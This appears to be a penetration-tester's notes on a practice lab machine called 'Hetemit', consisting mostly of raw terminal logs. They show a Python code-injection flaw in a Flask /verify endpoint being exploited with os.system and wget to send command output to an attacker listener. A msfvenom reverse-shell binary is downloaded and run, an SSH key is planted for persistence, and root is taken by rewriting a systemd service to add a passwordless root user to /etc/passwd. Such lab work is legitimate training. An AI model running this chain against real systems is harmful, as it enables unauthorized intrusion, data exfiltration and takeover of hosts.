# Hetemit

```
┌──(kali㉿DESKTOP-61F9HO2)-[/tmp]                                                       
└─$ wfuzz --hc 500 -w cmd-wordlist.txt -d "code=FUZZ" http://192.168.69.117:50000/verify
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************                                                                                                                        Target: http://192.168.69.117:50000/verify
Total requests: 102

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================                   
000000059:   200        0 L      3 W        22 Ch       "%0Aid"
000000061:   200        0 L      3 W        22 Ch       "%0Aid%0A"

Total time: 3.806988
Processed Requests: 102
Filtered Requests: 100
Requests/sec.: 26.79283 
```

## RCE Output

```
┌──(root💀DESKTOP-61F9HO2)-[/mnt/c/Users/Chan/My Documents/Terence Stuff/Hacking/tools]                                                                                     └─# curl 192.168.69.117:50000/verify --data 'code=%0Aos.system("wget 192.168.49.69:18000/ --post-data $(whoami)")'                                                              0┌── 
```

```
┌──(kali㉿DESKTOP-61F9HO2)-[/tmp]                                                       └─$ nc -nlvp 18000                                                                      Listening on 0.0.0.0 18000                                                              Connection received on 192.168.69.117 37634                                             POST / HTTP/1.1                                                                         User-Agent: Wget/1.19.5 (linux-gnu)                                                     Accept: */*                                                                             Accept-Encoding: identity                                                               Host: 192.168.49.69:18000                                                               Connection: Keep-Alive                                                                  Content-Type: application/x-www-form-urlencoded                                         Content-Length: 6                                                                                                                                                               cmeeks                                                                                  ^C
```

```
┌──(root💀DESKTOP-61F9HO2)-[/mnt/c/Users/Chan/My Documents/Terence Stuff/Hacking/tools]                                                                                     └─# curl 192.168.69.117:50000/verify --data 'code=%0Aos.system("wget 192.168.49.69:50000/ --post-data \"$(uname -a 2>%261)\"")'                                                 1024┌──(root💀DESKTOP-61F9HO2)-[/mnt/c/Users/Chan/My Documents/Terence Stuff/Hacking/tools]                                                                                     └─# curl 192.168.69.117:50000/verify --data 'code=%0Aos.system("wget 192.168.49.69:50000/ --post-data \"$(/tmp/shell.rev 2>%261)\"")'                                           1024┌──(root💀DESKTOP-61F9HO2)-[/mnt/c/Users/Chan/My Documents/Terence Stuff/Hacking/tools]                                                                                     └─# curl 192.168.69.117:50000/verify --data 'code=%0Aos.system("wget 192.168.49.69:50000/ --post-data \"$(/tmp/shell.rev 2>%261)\"")'
```


```
┌──(kali㉿DESKTOP-61F9HO2)-[~]                                                          └─$ nc -nlvp 50000                                                                      Listening on 0.0.0.0 50000                                                              Connection received on 192.168.69.117 44838                                             POST / HTTP/1.1                                                                         User-Agent: Wget/1.19.5 (linux-gnu)                                                     Accept: */*                                                                             Accept-Encoding: identity                                                               Host: 192.168.49.69:50000                                                               Connection: Keep-Alive                                                                  Content-Type: application/x-www-form-urlencoded                                         Content-Length: 109                                                                                                                                                             Linux hetemit 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux^C                                                                                                                                                         ┌──(kali㉿DESKTOP-61F9HO2)-[~]                                                          └─$ nc -nlvp 50000                                                                      Listening on 0.0.0.0 50000                                                              Connection received on 192.168.69.117 44850                                             POST / HTTP/1.1                                                                         User-Agent: Wget/1.19.5 (linux-gnu)                                                     Accept: */*                                                                             Accept-Encoding: identity                                                               Host: 192.168.49.69:50000                                                               Connection: Keep-Alive                                                                  Content-Type: application/x-www-form-urlencoded                                         Content-Length: 37                                                                                                                                                              sh: /tmp/shell.rev: Permission denied
```

# Reverse shell

```
┌──(root💀DESKTOP-61F9HO2)-[/mnt/c/Users/Chan/My Documents/Terence Stuff/Hacking/tools] └─# curl 192.168.69.117:50000/verify --data 'code=%0Aos.system("wget 192.168.49.69:50000/ --post-data \"$(wget 192.168.49.69:18000/shell.rev -O /tmp/rev  2>%261)\"")'          1024┌──(root💀DESKTOP-61F9HO2)-[/mnt/c/Users/Chan/My Documents/Terence Stuff/Hacking/tools]                                                                                     └─# curl 192.168.69.117:50000/verify --data 'code=%0Aos.system("wget 192.168.49.69:50000/ --post-data \"$(chmod 777 /tmp/rev 2>%261)\"")'                                       1024┌──(root💀DESKTOP-61F9HO2)-[/mnt/c/Users/Chan/My Documents/Terence Stuff/Hacking/tools]                                                                                     └─# curl 192.168.69.117:50000/verify --data 'code=%0Aos.system("wget 192.168.49.69:50000/ --post-data \"$(/tmp/rev 2>%261)\"")'
```


```
┌──(kali㉿DESKTOP-61F9HO2)-[~]                                                          └─$ nc -nlvp 50000                                                                      Listening on 0.0.0.0 50000                                                              Connection received on 192.168.69.117 44898                                             POST / HTTP/1.1                                                                         User-Agent: Wget/1.19.5 (linux-gnu)                                                     Accept: */*                                                                             Accept-Encoding: identity                                                               Host: 192.168.49.69:50000                                                               Connection: Keep-Alive                                                                  Content-Type: application/x-www-form-urlencoded                                         Content-Length: 364                                                                                                                                                             --2022-03-13 14:50:48--  http://192.168.49.69:18000/shell.rev                           Connecting to 192.168.49.69:18000... connected.                                         HTTP request sent, awaiting response... 200 OK                                          Length: 194 [application/octet-stream]                                                  Saving to: ‘/tmp/rev’                                                                                                                                                                0K                                                       100% 49.5M=0s                                                                                                     2022-03-13 14:50:48 (49.5 MB/s) - ‘/tmp/rev’ saved [194/194]^C                                                                                                                  ┌──(kali㉿DESKTOP-61F9HO2)-[~]                                                          └─$ nc -nlvp 50000                                                                      Listening on 0.0.0.0 50000 
```

```
┌──(kali㉿DESKTOP-61F9HO2)-[/tmp]                                                       └─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.69 LPORT=18000 -f elf -o shell.rev                                                                                 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload    [-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload                                            Payload size: 74 bytes                                                                  Final size of elf file: 194 bytes
Saved as: shell.rev                                                                                                                                                             ┌──(kali㉿DESKTOP-61F9HO2)-[/tmp]                                                       └─$ python3 -m http.server 18000                                                        Serving HTTP on 0.0.0.0 port 18000 (http://0.0.0.0:18000/) ...                          192.168.69.117 - - [13/Mar/2022 22:48:31] "GET /shell.rev HTTP/1.1" 200 -
^[[A^C                                                                                  Keyboard interrupt received, exiting.                                                                                                                                           ┌──(kali㉿DESKTOP-61F9HO2)-[/tmp]                                                       └─$ nc -nlvp 18000                                                                      Listening on 0.0.0.0 18000
^C                                                                                      
┌──(kali㉿DESKTOP-61F9HO2)-[/tmp]                                                       └─$ python3 -m http.server 18000                                                        Serving HTTP on 0.0.0.0 port 18000 (http://0.0.0.0:18000/) ...                          192.168.69.117 - - [13/Mar/2022 22:50:47] "GET /shell.rev HTTP/1.1" 200 -               ^C                                                                                      Keyboard interrupt received, exiting.                                                                                                                                           ┌──(kali㉿DESKTOP-61F9HO2)-[/tmp]                                                       └─$ nc -nlvp 18000                                                                      Listening on 0.0.0.0 18000                                                              Connection received on 192.168.69.117 37712                                             ^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[A^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B^[[B                                                                        /bin/sh: line 1: $'\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[A\E[B\E[B\E[B\E[B\E[B\E[B\E[B\E[B\E[B\E[B': command not found                                 whoami                                                                                  cmeeks 
pwd                                                                                     /home/cmeeks/restjson_hetemit
cd ..                                                                                   ls                                                                                      local.txt
register_hetemit                                                                        restjson_hetemit                                                                        share
cat local.txt
a27c8cbc15d2bd6988632808985f11e4                                                        ifconfig                                                                                /bin/sh: line 7: ifconfig: command not found                                            /sbin/ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500                                    inet 192.168.69.117  netmask 255.255.255.0  broadcast 192.168.69.255                    inet6 fe80::c23d:c707:9770:ddae  prefixlen 64  scopeid 0x20<link>                       ether 00:50:56:ba:67:65  txqueuelen 1000  (Ethernet)                                    RX packets 5575  bytes 595360 (581.4 KiB)                                               RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 5515  bytes 779241 (760.9 KiB)                                               TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                                                                                                              lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                                                    inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)                                                 RX packets 2923  bytes 969215 (946.4 KiB)                                               RX errors 0  dropped 0  overruns 0  frame 0                                             TX packets 2923  bytes 969215 (946.4 KiB)                                               TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```
## ssh

```
mkdir .ssh                                                                              cd .ssh                                                                                 echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxTqZC9zdTSFte3KadddXjUQKjFD/qTMq1KLLthEcf8EeZB0cx4GnC+msACTX7tYfvtBR8702YE16Xz8jD6GIb/JAc3LPm1UHTbAeRzlpmo2fWqAGuUmX6BJ+1eEGDVKdeD0aK/zjTjaMRSCowFfaaOgtwyMdELQibz3y7UtD9vVZ1D5qlpRUOfsKHTfpS3IIHek0XK91K/M8C2XoeKEsVscWjAmHACg/inAJwjpxK7I02LJUgJ2X4qx4tqmFVjeJnXcxUn4hB56bv8IQ++rtnOSw86sJrf206WXuonmQ8LWdQilmaNm2c7jAdGMPo+zXMjgmGLiSLnCw8ZSlYkcg5ma0Uq0SA+Cr0iypqU/AkRJqVCTgA72VVI/WPylJ7vjFJgLyt3v3W5PkRqih963vnqt8B/irKZl539BW7ySJyviynRCwaDaaCCSJeZzP5pol7HUO0+3J4HBeY/YgpSEuzTpUwuhV5H6gxgmMSRZlp+FcOvKXBTOgFqJQeDq+sYQs= kali@DESKTOP-61F9HO2' > authorized_keys
```

```
┌──(kali㉿DESKTOP-61F9HO2)-[~]                                                          └─$ cat ~/.ssh/id_rsa.pub                                                               ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxTqZC9zdTSFte3KadddXjUQKjFD/qTMq1KLLthEcf8EeZB0cx4GnC+msACTX7tYfvtBR8702YE16Xz8jD6GIb/JAc3LPm1UHTbAeRzlpmo2fWqAGuUmX6BJ+1eEGDVKdeD0aK/zjTjaMRSCowFfaaOgtwyMdELQibz3y7UtD9vVZ1D5qlpRUOfsKHTfpS3IIHek0XK91K/M8C2XoeKEsVscWjAmHACg/inAJwjpxK7I02LJUgJ2X4qx4tqmFVjeJnXcxUn4hB56bv8IQ++rtnOSw86sJrf206WXuonmQ8LWdQilmaNm2c7jAdGMPo+zXMjgmGLiSLnCw8ZSlYkcg5ma0Uq0SA+Cr0iypqU/AkRJqVCTgA72VVI/WPylJ7vjFJgLyt3v3W5PkRqih963vnqt8B/irKZl539BW7ySJyviynRCwaDaaCCSJeZzP5pol7HUO0+3J4HBeY/YgpSEuzTpUwuhV5H6gxgmMSRZlp+FcOvKXBTOgFqJQeDq+sYQs= kali@DESKTOP-61F9HO2                                                                                                                                   ┌──(kali㉿DESKTOP-61F9HO2)-[~]                                                          └─$ ssh cmeeks@192.168.49.69
The authenticity of host '192.168.49.69 (192.168.49.69)' can't be established.          ED25519 key fingerprint is SHA256:fQjalbiq+g5IAZ/A1LG0Dg842omO07jqbU2NIIdy0HU.          This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? ^C

┌──(kali㉿DESKTOP-61F9HO2)-[~]
└─$ ssh cmeeks@192.168.69.117
The authenticity of host '192.168.69.117 (192.168.69.117)' can't be established.
ED25519 key fingerprint is SHA256:lncQzilVmJcYmSxhFreTweZeyaqTAiomI9pvTK0k7ac.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.69.117' (ED25519) to the list of known hosts.
Activate the web console with: systemctl enable --now cockpit.socket

[cmeeks@hetemit ~]$ 
```

# Privesc

```
[cmeeks@hetemit tmp]$ cat /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App                                                                  After=network-online.target

[Service]                                                                               Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000                                                 TimeoutSec=30                                                                           RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID                                                     Restart=on-failure

[Install]                                                                               WantedBy=multi-user.target
[cmeeks@hetemit tmp]$ nano /etc/systemd/system/pythonapp.service
[cmeeks@hetemit tmp]$ cat /etc/systemd/system/pythonapp.service                         [Unit]
Description=Python App
After=network-online.target                                                                                                                                                     [Service]                                                                               Type=simple                                                                             WorkingDirectory=/home/cmeeks/restjson_hetemit                                          ExecStart=cp /bin/bash /bash && chmod u+s /bash
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
[cmeeks@hetemit tmp]$ 
[cmeeks@hetemit tmp]$ sudo -l
Matching Defaults entries for cmeeks on hetemit:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",                env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",                    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin                                                                                                                                User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
[cmeeks@hetemit tmp]$ sudo /sbin/reboot
Connection to 192.168.69.117 closed by remote host.
Connection to 192.168.69.117 closed.
```
That failed

Try again
```
[cmeeks@hetemit ~]$ cat /etc/systemd/system/pythonapp.service                           [Unit]
Description=Python App                                                                  After=network-online.target                                                             
[Service]                                                                               Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit                                          ExecStart=echo "dummyroot:EyJdPLm4o5WkY:0:0:root:/root:/bin/bash" >> /etc/passwd
TimeoutSec=30                                                                           RestartSec=15s
User=root                                                                               ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure                                                                      
[Install]                                                                               WantedBy=multi-user.target
[cmeeks@hetemit ~]$ sudo -l
Matching Defaults entries for cmeeks on hetemit:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
[cmeeks@hetemit ~]$ sudo /sbin/reboot
Connection to 192.168.69.117 closed by remote host.
Connection to 192.168.69.117 closed.

┌──(kali㉿DESKTOP-61F9HO2)-[~] 
```

```
[cmeeks@hetemit ~]$ nano /etc/systemd/system/pythonapp.service
[cmeeks@hetemit ~]$ sudo /sbin/reboot
Connection to 192.168.69.117 closed by remote host.
Connection to 192.168.69.117 closed.

┌──(kali㉿DESKTOP-61F9HO2)-[~]
└─$ ssh cmeeks@192.168.69.117
Activate the web console with: systemctl enable --now cockpit.socket

Last login: Sun Mar 13 15:23:03 2022 from 192.168.49.69
[cmeeks@hetemit ~]$ cd ..
[cmeeks@hetemit home]$ su dummyroot
Password:
[root@hetemit home]# cd /root
[root@hetemit ~]# cat /etc/systemd/system/pythonapp.service
[Unit]
Description=rooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'echo "dummyroot:EyJdPLm4o5WkY:0:0:root:/root:/bin/bash" >> /etc/passwd'

[Install]
WantedBy=multi-user.target
[root@hetemit ~]# cat proof.txt
4df60cf6e60aace91b65f487e63028d1
[root@hetemit ~]# /sbin/ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.69.117  netmask 255.255.255.0  broadcast 192.168.69.255
        ether 00:50:56:ba:67:65  txqueuelen 1000  (Ethernet)
        RX packets 166  bytes 17150 (16.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 106  bytes 13945 (13.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 25  bytes 4957 (4.8 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 25  bytes 4957 (4.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

[root@hetemit ~]# cat
```

https://alvinsmith.gitbook.io/progressive-oscp/untitled/vulnversity-privilege-escalation
